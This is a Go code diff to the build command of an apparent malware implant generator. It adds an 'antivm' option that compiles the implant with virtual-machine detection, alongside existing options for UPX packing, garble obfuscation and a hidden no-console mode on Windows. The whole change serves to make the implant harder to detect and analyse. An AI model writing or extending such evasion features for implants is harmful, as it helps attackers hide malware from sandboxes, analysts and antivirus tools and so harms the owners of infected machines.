@@ -30,6 +30,7 @@ type GenerateConfig struct {
 	UseUPX     bool
 	Obfuscate  bool
 	Quiet      bool
+	Antivm     bool
 }
 
 func RunGenerate(args []string) error {
@@ -48,6 +49,7 @@ func RunGenerate(args []string) error {
 	fs.BoolVar(&cfg.UseUPX, "upx", true, "compress with UPX")
 	fs.BoolVar(&cfg.Obfuscate, "obfuscate", false, "obfuscate the implant with garble (auto-installs if missing)")
 	fs.BoolVar(&cfg.Quiet, "quiet", false, "suppress output and run in background (no console on Windows)")
+	fs.BoolVar(&cfg.Antivm, "antivm", false, "enable VM detection (pure Go, no CGO required — 65+ techniques, VMAware-compatible scoring)")
 	fs.Parse(args)
 
 	return BuildImplant(cfg)
@@ -102,12 +104,17 @@ func BuildImplant(cfg GenerateConfig) error {
 			return fmt.Errorf("garble not available: %w", err)
 		}
 		builder = garble
-		buildArgs = []string{"-literals", "-tiny", "build", "-trimpath", "-buildvcs=false", "-o", outPath, "-ldflags=" + ldflags, "./implant/"}
+		buildArgs = []string{"-literals", "-tiny", "build", "-trimpath", "-buildvcs=false", "-o", outPath, "-ldflags=" + ldflags}
 		log.Printf("obfuscating with garble")
 	} else {
 		builder = goBin
-		buildArgs = []string{"build", "-trimpath", "-buildvcs=false", "-o", outPath, "-ldflags=" + ldflags, "./implant/"}
+		buildArgs = []string{"build", "-trimpath", "-buildvcs=false", "-o", outPath, "-ldflags=" + ldflags}
 	}
+
+	if cfg.Antivm {
+		buildArgs = append(buildArgs, "-tags=antivm")
+	}
+	buildArgs = append(buildArgs, "./implant/")
 
 	cmd := exec.Command(builder, buildArgs...)
 	path := os.Getenv("PATH")
@@ -115,12 +122,13 @@ func BuildImplant(cfg GenerateConfig) error {
 	if !strings.Contains(path, goDir) {
 		path = goDir + ":" + path
 	}
-	cmd.Env = append(os.Environ(),
-		"GOOS="+cfg.TargetOS,
-		"GOARCH="+cfg.TargetArch,
+	env := []string{
+		"GOOS=" + cfg.TargetOS,
+		"GOARCH=" + cfg.TargetArch,
 		"CGO_ENABLED=0",
-		"PATH="+path,
-	)
+		"PATH=" + path,
+	}
+	cmd.Env = append(os.Environ(), env...)
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	cmd.Dir = buildDir
